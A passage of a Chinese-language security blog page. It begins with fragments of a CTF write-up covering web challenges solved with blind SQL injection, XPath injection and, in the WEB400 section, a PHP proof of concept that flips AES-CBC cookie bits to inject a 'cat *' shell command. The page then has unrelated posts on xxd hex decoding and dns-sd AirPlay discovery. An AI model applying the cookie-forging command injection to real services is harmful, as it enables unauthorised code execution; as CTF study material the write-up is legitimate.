        https://p.6core.net/p/0lAkDRAsvPqj1zeMVz6A5xcl&gt; using blind
        injection but i know the author has a one-liner which will
        return the value directly without using blind injection
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/46">http://hardc0de.ctf.su/archives/46</a></li>
</ul>


<h2>WEB200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/11">http://hardc0de.ctf.su/archives/11</a></li>
</ul>


<h2>WEB300</h2>

<h3>Reference</h3>

<pre><code>&lt; daniel1024&gt; xpath injection in web100?
&lt; daniel1024&gt; *300
&lt;@gijs&gt; daniel1024: yes xpath injection
&lt; RlIxOTA4&gt; web300 was xpat
&lt; RlIxOTA4&gt; h
</code></pre>

<h2>WEB400</h2>

<p>這題很有趣！雖然我們沒有解出來 XD</p>

<p>一開始要利用 <code>function hmac($data)</code> 裡的 typo 讓我們可以假造合法的 cookie ，
接著再利用 AES CBC mode 解密時會和前一個 block 做 xor 的特性，
只要知道某一段 plaintext 是什麼，就可以在 ciphertext 中 xor 前一個 block ，
讓解出來的 plaintext 變成我們想要的（超抽象 XD ）</p>

<p>沒有寫完整 writeup ，有興趣的人可以看下面的 reference 研究一下 PoC ！</p>

<h3>Reference</h3>

<pre><code>&lt; phiber_&gt; web400 solution http://privatepaste.com/1d0f3254f6

&lt;?php
$a = base64_decode(urldecode('%2FW8w%2BUpwN%2B2vh85b54XcyGM2wSNNFFcBqoGr%2BX5S7FOuJn%2FJBJwp1R1F5VpqsR9NkW82Ut8L5hPFKa%2BWIEs2W9DP9Qnq9zhmAJ5FwbNcY6viYT2kZd1Yz06lplcsnRuaFU8gj5TV9jHX8wps2%2BTaAO68TrHgF3Scvt56BrGAlZX%2Fp24qGKQf5m%2B15RdsgC6M%2BQ9Fl7KhwazU1F9yJ9rx7GH5HsCC4ztYeVVoiFYQQIDMPMHZkIeA7sbYrhH6L9Ej8DlEb2dErkHBVP98Wp5aAxm8jIXeqgBHfPF8s26o%2Bjs2T6XfWm3cv%2FN4yp93yGEpSja7dAr1Bdw3k1TVVPAqzGFBA2SbB6skHQhNiC5hfJ4TdymBfzzt8QLvGT3KKBlQP1sgNcLIpwhFCOGlGkN1Nq7%2Bb2GV5h%2FtyLH%2FTW2LGuVcBCTRXFY7mC0IPV2WCFSTyOddnX5t2sNeU9zBop9WeWQe199f50%2FRKRX4aA%2FLsSrGqv%2F2s4z96n9I0Zu4oGcpb9hGh3zvzGZQy6J4TAeKRKCRsIW3vDFacngSGcUAklS4nsRqXJBVEZ70WcBFQjVI7zMX8cjJS8RiyQLKgGpKirYotsetFk98xonYzbwBnyNLiNFEM0WSsPoDSW2UvQe3NfDEJKwT63l9uaAHTbfWXQ%3D%3D'));
$blocks = str_split($a, 16);
$blocks[22] = $blocks[22] ^ str_repeat('a', 16) ^ "';cat *; echo 'a";
$b = implode('', $blocks);
echo urlencode(base64_encode($b))."\n";
?&gt;
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/43">http://hardc0de.ctf.su/archives/43</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/08/yong-xxd-jie-hex-string/">用 Xxd 解 Hex String</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-08T13:57:00+08:00" pubdate data-updated="true">Nov 8<span>th</span>, 2013</time>
        
           | <a href="/blog/2013/11/08/yong-xxd-jie-hex-string/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2013/11/08/yong-xxd-jie-hex-string/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>本來解 hex string 都是用有點醜的 perl one-liner</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ perl -ne 'print map chr hex, m/../g' &lt;&lt;&lt; 646d340a
</span><span class='line'>dm4</span></code></pre></td></tr></table></div></figure>


<p>不過昨天又研究了一下 <code>xxd</code> 發現一些神秘的功能，像是發現有 C style 的 output ！</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -i data
</span><span class='line'>unsigned char data[] = {
</span><span class='line'>  0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x62, 0x69, 0x61, 0x6e,
</span><span class='line'>  0x72, 0x79, 0x3f, 0x0a
</span><span class='line'>};
</span><span class='line'>unsigned int data_len = 16;</span></code></pre></td></tr></table></div></figure>


<p>還可以調 column 數</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -i -c 8 data
</span><span class='line'>unsigned char data[] = {
</span><span class='line'>  0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20,
</span><span class='line'>  0x62, 0x69, 0x61, 0x6e, 0x72, 0x79, 0x3f, 0x0a
</span><span class='line'>};
</span><span class='line'>unsigned int data_len = 16;</span></code></pre></td></tr></table></div></figure>


<p>然後 <a href="http://blog.atdog.org">atdog</a> 大大看到之後，又教了我怎麼用 <code>xxd</code> 解 hex string</p>

<ul>
<li>生 hex string</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -p &lt;&lt;&lt; dm4
</span><span class='line'>646d340a</span></code></pre></td></tr></table></div></figure>


<ul>
<li>解 hex string</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -p -r &lt;&lt;&lt; 646d340a
</span><span class='line'>dm4</span></code></pre></td></tr></table></div></figure>


<p>太帥了！而且比原本 perl one-liner 短好多啊啊啊</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes/">Dns-sd &amp; AirPlay / AirTunes</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-08T11:59:00+08:00" pubdate data-updated="true">Nov 8<span>th</span>, 2013</time>
        
           | <a href="/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Usage</h2>

<pre><code>$ dns-sd
dns-sd -E                  (Enumerate recommended registration domains)
dns-sd -F                      (Enumerate recommended browsing domains)
dns-sd -R &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt; &lt;Port&gt; [&lt;TXT&gt;...] (Register a service)
dns-sd -B        &lt;Type&gt; &lt;Domain&gt;        (Browse for services instances)
dns-sd -L &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt;           (Look up a service instance)
dns-sd -P &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt; &lt;Port&gt; &lt;Host&gt; &lt;IP&gt; [&lt;TXT&gt;...]  (Proxy)
dns-sd -q &lt;name&gt; &lt;rrtype&gt; &lt;rrclass&gt; (Generic query for any record type)
dns-sd -Z        &lt;Type&gt; &lt;Domain&gt;   (Output results in Zone File format)
dns-sd -G     v4/v6/v4v6 &lt;name&gt;  (Get address information for hostname)
dns-sd -V    (Get version of currently running daemon / system service)
</code></pre>

<h2>Type</h2>

<ul>
<li>AirTunes 是 <code>_raop._tcp.</code></li>
<li>AirPlay 是 <code>_airplay._tcp.</code></li>
</ul>


<h2>Browse &amp; Look up</h2>

<pre><code>$ dns-sd -B _raop._tcp
Browsing for _raop._tcp
Timestamp     A/R Flags if Domain                    Service Type              Instance Name
17:05:13.971  Add     3  8 local.                    _raop._tcp.               C92A14084F64@Hello

$ dns-sd -L "C92A14084F64@Hello" _raop._tcp.
Lookup C92A14084F64@Hello._raop._tcp..local
17:11:26.993  C92A14084F64@Hello._raop._tcp.local. can be reached at Hello.local.:50391 (interface 8) Flags: 1
 et=0,3,5 cn=1,2,3 da=true sf=0x4 tp=UDP vv=1 pw=false am=AppleTV3,1 txtvers=1 vn=65537 md=0,1,2 vs=150.33 sv=false ch=2 sr=44100 rhd=4.6.5 ss=16
</code></pre>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/2/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/03/17/build-gh60-revchn-on-mac/">在 Mac OSX 上編譯 GH60 RevCHN Firmware</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/13/secuinside-2014-final-writeup-reversing-100/">SECUINSIDE CTF Finals 2014 Writeup - Reversing 100</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/05/11/my-first-experience-with-phantomjs/">PhantomJS 初體驗</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/04/24/airplay-encryption/">AirPlay Encryption</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/04/22/convert-usb-keyboard-to-bluetooth-keyboard/">自製 USB 鍵盤轉藍芽鍵盤轉接器</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/23/vim-ia-writer-theme-for-markdown/">Vim iA Writer Theme for Markdown</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/">小額付費簡訊詐騙</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/08/ebctf-2013-writeup/">ebCTF 2013 Writeup</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  
  <a href="https://github.com/dm4">@dm4</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'dm4',
            count: 5,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>



<section class="googleplus googleplus-hidden">
  <h1>
    <a href="https://plus.google.com/111055170376328497079?rel=author">
      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
      Google+
    </a>
  </h1>
</section>


<section>
  <h1>Twitter</h1>
  <a class="twitter-timeline" href="https://twitter.com/dm4" data-widget-id="398539610571014144" data-tweet-limit="5" data-chrome="noscrollbar nofooter transparent">Tweets by @dm4</a>
</section>

  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - dm4 -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'dm4';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>





  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
